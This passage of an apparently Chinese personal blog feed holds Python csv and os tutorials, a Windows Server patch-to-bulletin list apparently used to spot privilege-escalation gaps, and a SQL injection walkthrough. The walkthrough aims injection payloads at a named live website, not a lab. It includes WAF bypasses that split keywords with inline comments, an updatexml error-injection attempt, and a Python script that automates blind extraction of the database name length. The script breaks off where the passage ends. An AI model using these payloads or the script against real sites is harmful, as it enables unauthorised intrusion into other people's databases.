class="string">&#x27;17&#x27;</span>, <span class="string">&#x27;90&#x27;</span>], [<span class="string">&#x27;jerry&#x27;</span>, <span class="string">&#x27;19&#x27;</span>, <span class="string">&#x27;95&#x27;</span>]])</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><h5 id="CSV文件的读取"><a href="#CSV文件的读取" class="headerlink" title="CSV文件的读取"></a>CSV文件的读取</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以读取方式打开一个csv文件</span></span><br><span class="line">file = open(<span class="string">&#x27;steady.csv&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用csv模块的reader方法，得到的结果是一个可迭代对象</span></span><br><span class="line">reader = csv.reader(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对结果进行遍历，获取到结果里的每一行数据</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">    print(row)</span><br><span class="line"></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Python处理excel文档&quot;&gt;&lt;a href=&quot;#Python处理excel文档&quot; class=&quot;headerlink&quot; title=&quot;Python处理excel文档&quot;&gt;&lt;/a&gt;Python处理excel文档&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;https://</summary>
      
    
    
    
    <category term="Python学习" scheme="http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Python" scheme="http://s1eady.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习--os库的使用</title>
    <link href="http://s1eady.top/2020/11/10/Python%E5%AD%A6%E4%B9%A0--os%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/11/10/Python%E5%AD%A6%E4%B9%A0--os%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2020-11-10T00:34:13.000Z</published>
    <updated>2020-11-10T01:29:26.011Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h1><p>OS模块简单的来说它是一个Python的系统编程的操作模块，可以处理文件和目录这些我们日常手动需要做的操作。</p><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><h3 id="获取当前系统"><a href="#获取当前系统" class="headerlink" title="获取当前系统"></a>获取当前系统</h3><figure class="highlight python"><figcaption><span>y</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">print(os.name)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#若是Windows则输出&#39;nt&#39;，若是Linux&#x2F;Unix，则是&#39;posix&#39;</span><br></pre></td></tr></table></figure><h3 id="获取当前文件的绝对路径"><a href="#获取当前文件的绝对路径" class="headerlink" title="获取当前文件的绝对路径"></a>获取当前文件的绝对路径</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">steady_path = os.path.abspath(__file__)</span><br><span class="line">print(steady_path)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady.py</span><br></pre></td></tr></table></figure><h3 id="获取当前目录"><a href="#获取当前目录" class="headerlink" title="获取当前目录"></a>获取当前目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">cwd &#x3D; os.getcwd()</span><br><span class="line">print(cwd)</span><br></pre></td></tr></table></figure><p>输出：获取的是python的工作目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Users&#x2F;apple</span><br></pre></td></tr></table></figure><h3 id="判断文件是否存在，返回值为布尔型"><a href="#判断文件是否存在，返回值为布尔型" class="headerlink" title="判断文件是否存在，返回值为布尔型"></a>判断文件是否存在，返回值为布尔型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">steady_path = <span class="string">r&quot;/Users/apple/Desktop/steady.py&quot;</span></span><br><span class="line">steady_file = os.path.exists(steady_path)</span><br><span class="line">print(<span class="string">&quot;file path: [&#123;&#125;] is exist: &#123;&#125;&quot;</span>.format(steady_path, steady_file))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file path: [&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady.py] is exist: True</span><br></pre></td></tr></table></figure><h3 id="获取当前文件的名称"><a href="#获取当前文件的名称" class="headerlink" title="获取当前文件的名称"></a>获取当前文件的名称</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">steady_name = os.path.basename(__file__)</span><br><span class="line">print(steady_name)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady.py</span><br></pre></td></tr></table></figure><h3 id="文件重命名"><a href="#文件重命名" class="headerlink" title="文件重命名"></a>文件重命名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">old_file = <span class="string">r&quot;/Users/apple/Desktop/steady.py&quot;</span></span><br><span class="line"></span><br><span class="line">new_file = <span class="string">r&quot;/Users/apple/Desktop/steady.py&quot;</span></span><br><span class="line"></span><br><span class="line">os.rename(old_file, new_file)</span><br></pre></td></tr></table></figure><h3 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h3><h4 id="os-makedirs"><a href="#os-makedirs" class="headerlink" title="os.makedirs"></a><code>os.makedirs</code></h4><p>创建多级目录，路径中的多个文件夹都不存在时，可以递归创建，steady和steady1文件夹本身没有。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady&#x2F;steady1&quot;</span><br><span class="line">os.mkdir(steady_path)</span><br></pre></td></tr></table></figure><h4 id="os-path-mkdir"><a href="#os-path-mkdir" class="headerlink" title="os.path.mkdir"></a><code>os.path.mkdir</code></h4><p>只能创建一个文件夹， steady文件夹存在，才能创建steady1文件夹，如果steady文件夹不存在，则会出错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady&#x2F;steady1&quot;</span><br><span class="line">os.mkdir(steady_path)</span><br></pre></td></tr></table></figure><h3 id="获取文件夹下的所有文件名"><a href="#获取文件夹下的所有文件名" class="headerlink" title="获取文件夹下的所有文件名"></a>获取文件夹下的所有文件名</h3><p>获取文件夹code下的所有文件名，以列表的形式返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&quot;</span><br><span class="line">steady_names &#x3D; os.listdir(steady_path)</span><br><span class="line">print(steady_names)</span><br></pre></td></tr></table></figure><h3 id="获取文件夹下的所有文件夹和文件（无递归遍历）"><a href="#获取文件夹下的所有文件夹和文件（无递归遍历）" class="headerlink" title="获取文件夹下的所有文件夹和文件（无递归遍历）"></a>获取文件夹下的所有文件夹和文件（无递归遍历）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(os.scandir(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;&quot;))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;posix.ScandirIterator object at 0x1056a1e30&gt;</span><br></pre></td></tr></table></figure><p>返回的是可迭代对象，可以用for循环迭代一下遍出结果。</p><h3 id="f-is-file"><a href="#f-is-file" class="headerlink" title="f.is_file()"></a>f.is_file()</h3><p>is_file判断是否是文件。</p><h3 id="将path分割成路径名和文件名"><a href="#将path分割成路径名和文件名" class="headerlink" title="将path分割成路径名和文件名"></a>将path分割成路径名和文件名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;))</span><br><span class="line">print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;)[0])</span><br><span class="line">print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;)[1])</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Users&#x2F;apple&#x2F;Desktop</span><br><span class="line">steady1.py</span><br></pre></td></tr></table></figure><h3 id="拼接目录与文件名或目录"><a href="#拼接目录与文件名或目录" class="headerlink" title="拼接目录与文件名或目录"></a>拼接目录与文件名或目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">print(os.path.join(&#39;I&#39;, &#39;am&#39;, &#39;steady&#39;))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I&#x2F;am&#x2F;steady</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;OS&quot;&gt;&lt;a href=&quot;#OS&quot; class=&quot;headerlink&quot; title=&quot;OS&quot;&gt;&lt;/a&gt;OS&lt;/h1&gt;&lt;p&gt;OS模块简单的来说它是一个Python的系统编程的操作模块，可以处理文件和目录这些我们日常手动需要做的操作。&lt;/p&gt;
&lt;h2 id=&quot;使用方</summary>
      
    
    
    
    <category term="Python学习" scheme="http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Python" scheme="http://s1eady.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--windows系统常见漏洞与系统补丁</title>
    <link href="http://s1eady.top/2020/11/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%A1%A5%E4%B8%81/"/>
    <id>http://s1eady.top/2020/11/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%A1%A5%E4%B8%81/</id>
    <published>2020-11-06T21:03:06.000Z</published>
    <updated>2020-11-21T08:40:54.028Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Win2003"><a href="#Win2003" class="headerlink" title="Win2003"></a>Win2003</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">KB2360937|MS10-084</span><br><span class="line">KB2478960|MS11-014</span><br><span class="line">KB2507938|MS11-056</span><br><span class="line">KB2566454|MS11-062</span><br><span class="line">KB2646524|MS12-003</span><br><span class="line">KB2645640|MS12-009</span><br><span class="line">KB2641653|MS12-018</span><br><span class="line">KB944653|MS07-067</span><br><span class="line">KB952004|MS09-012 PR</span><br><span class="line">KB971657|MS09-041</span><br><span class="line">KB2620712|MS11-097</span><br><span class="line">KB2393802|MS11-011</span><br><span class="line">KB942831|MS08-005</span><br><span class="line">KB2503665|MS11-046</span><br><span class="line">KB2592799|MS11-080</span><br><span class="line">KB956572|MS09-012烤肉</span><br><span class="line">KB2621440|MS12-020</span><br><span class="line">KB977165|MS10-015Ms Viru</span><br><span class="line">KB3139914|MS16-032</span><br><span class="line">KB3124280|MS16-016</span><br><span class="line">KB3134228|MS16-014</span><br><span class="line">KB3079904|MS15-097</span><br><span class="line">KB3077657|MS15-077</span><br><span class="line">KB3045171|MS15-051</span><br><span class="line">KB3000061|MS14-058</span><br><span class="line">KB2829361|MS13-046</span><br><span class="line">KB2850851|MS13-053EPATHOBJ 0day 限32位</span><br><span class="line">KB2707511|MS12-042  sysret -pid</span><br><span class="line">KB2124261|KB2271195  MS10-065 IIS7</span><br><span class="line">KB970483|MS09-020IIS6</span><br></pre></td></tr></table></figure><h1 id="Win2008"><a href="#Win2008" class="headerlink" title="Win2008"></a>Win2008</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">KB3139914|MS16-032</span><br><span class="line">KB3124280|MS16-016</span><br><span class="line">KB3134228|MS16-014</span><br><span class="line">KB3079904|MS15-097</span><br><span class="line">KB3077657|MS15-077</span><br><span class="line">KB3045171|MS15-051</span><br><span class="line">KB3000061|MS14-058</span><br><span class="line">KB2829361|MS13-046</span><br><span class="line">KB2850851|MS13-053EPATHOBJ 0day  限32位</span><br><span class="line">KB2707511|MS12-042 sysret -pid</span><br><span class="line">KB2124261|KB2271195  MS10-065 IIS7</span><br><span class="line">KB970483|MS09-020IIS6</span><br></pre></td></tr></table></figure><h1 id="Win2012"><a href="#Win2012" class="headerlink" title="Win2012"></a>Win2012</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">KB3139914|MS16-032</span><br><span class="line">KB3124280|MS16-016</span><br><span class="line">KB3134228|MS16-014</span><br><span class="line">KB3079904|MS15-097</span><br><span class="line">KB3077657|MS15-077</span><br><span class="line">KB3045171|MS15-051</span><br><span class="line">KB3000061|MS14-058</span><br><span class="line">KB2829361|MS13-046</span><br><span class="line">KB2850851|MS13-053EPATHOBJ 0day  限32位</span><br><span class="line">KB2707511|MS12-042 sysret -pid</span><br><span class="line">KB2124261|KB2271195  MS10-065 IIS7</span><br><span class="line">KB970483|MS09-020IIS6</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Win2003&quot;&gt;&lt;a href=&quot;#Win2003&quot; class=&quot;headerlink&quot; title=&quot;Win2003&quot;&gt;&lt;/a&gt;Win2003&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--SQL注入漏洞手注练习</title>
    <link href="http://s1eady.top/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%8B%E6%B3%A8%E7%BB%83%E4%B9%A0/"/>
    <id>http://s1eady.top/2020/10/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%89%8B%E6%B3%A8%E7%BB%83%E4%B9%A0/</id>
    <published>2020-10-23T13:21:43.000Z</published>
    <updated>2020-11-23T03:36:56.500Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入漏洞手注练习"><a href="#SQL注入漏洞手注练习" class="headerlink" title="SQL注入漏洞手注练习"></a>SQL注入漏洞手注练习</h1><h2 id="Exp1"><a href="#Exp1" class="headerlink" title="Exp1"></a>Exp1</h2><h3 id="判断字符、数字型、闭合方式"><a href="#判断字符、数字型、闭合方式" class="headerlink" title="判断字符、数字型、闭合方式"></a>判断字符、数字型、闭合方式</h3><p>报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890%27</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in &#x2F;home2&#x2F;kindleup&#x2F;public_html&#x2F;nfca&#x2F;pModule.php on line 517</span><br></pre></td></tr></table></figure><p>正常回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890%27--+</span><br></pre></td></tr></table></figure><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><h4 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h4><p>正常回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&#39; order by 6-- </span><br></pre></td></tr></table></figure><p>输出错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&#39; order by 7-- </span><br></pre></td></tr></table></figure><p>判断字段数量为6。</p><h4 id="回显显示位"><a href="#回显显示位" class="headerlink" title="回显显示位"></a>回显显示位</h4><p>WAF拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union select 1,2,3,4,5,6-- </span><br></pre></td></tr></table></figure><p>拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union select-- </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union-- </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; select-- </span><br></pre></td></tr></table></figure><p>不拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union sel&#x2F;**&#x2F;ect-- </span><br></pre></td></tr></table></figure><p>报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; union sele&#x2F;**&#x2F;ct 1,2,3,4,5,6-- </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in &#x2F;home2&#x2F;kindleup&#x2F;public_html&#x2F;nfca&#x2F;pModule.php on line 517</span><br></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>WAF拦截</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; and updatexml(0,concat(0x7e,database(),0x7e),0)-- </span><br></pre></td></tr></table></figure><p>WAF不拦截但是报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;-20160901235755890&#39; and updat&#x2F;**&#x2F;exml(0,co&#x2F;**&#x2F;ncat(0x7e,database(),0x7e),0)-- </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: mysqli_fetch_array() expects parameter 1 to be mysqli_result, boolean given in &#x2F;home2&#x2F;kindleup&#x2F;public_html&#x2F;nfca&#x2F;pModule.php on line 517</span><br></pre></td></tr></table></figure><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h4><p>页面正常回显。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.nfca.org.tw&#x2F;activity_content.php?ac01&#x3D;20160901235755890&#39; and if(length(database())&#x3D;13,1,0)-- </span><br></pre></td></tr></table></figure><h4 id="延时注入POC"><a href="#延时注入POC" class="headerlink" title="延时注入POC"></a>延时注入POC</h4><h5 id="判断数据库长度"><a href="#判断数据库长度" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fake_useragent <span class="keyword">import</span> UserAgent </span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span>(<span class="params">url,headers</span>):</span></span><br><span class="line">    r=requests.get(url=url,headers=headers)</span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysis_node</span>(<span class="params">html_content</span>):</span></span><br><span class="line">    html = etree.HTML(html_content)</span><br><span class="line">    content = html.xpath(<span class="string">&quot;//span[@style=&#x27;font-size:28px&#x27;]/text()&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database_len</span>(<span class="params">url</span>):</span></span><br><span class="line">    print(<span class="string">&quot;开始判断数据库的长度————————————————————————————————————————————————————————————————————————————————————————————&quot;</span>)</span><br><span class="line">    min_length=<span class="number">1</span></span><br><span class="line">    max_length=<span class="number">15</span></span><br><span class="line">    database_length=harf_find(min_length,max_length,url)</span><br><span class="line">    print(<span class="string">&quot;数据库的长度为：&quot;</span>+str(database_length))</span><br><span class="line">    print(<span class="string">&quot;数据库长度判断结束————————————————————————————————————————————————————————————————————————————————————————————--&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">harf_find</span>(<span class="params">min_value,max_value,url</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(min_value&lt;=max_value):</span><br><span class="line">        mid_value=int((min_value+max_value)/<span class="number">2</span>)</span><br><span class="line">        print(mid_value)</span><br><span class="line">        url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(length(database())&gt;%d,1,0)--+&quot;</span>%mid_value</span><br><span class="line">        print(<span class="string">&quot;当前url为:&quot;</span>+url)</span><br><span class="line"><span class="comment">#        time.sleep(10)</span></span><br><span class="line">        html_content=crawl(url,headers)</span><br><span class="line">        last_content=analysis_node(html_content)</span><br><span class="line">        print(last_content)</span><br><span class="line">        <span class="keyword">if</span> last_content:</span><br><span class="line">            min_value=mid_value+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_value=mid_value<span class="number">-1</span></span><br><span class="line">    mid_value=int((min_value+max_value+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:ua.random&#125;</span><br><span class="line">    database_length_url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(length(database())&gt;%d,1,0)--+&quot;</span></span><br><span class="line">    get_database_len(database_length_url)</span><br></pre></td></tr></table></figure><h5 id="判断数据库名字"><a href="#判断数据库名字" class="headerlink" title="判断数据库名字"></a>判断数据库名字</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 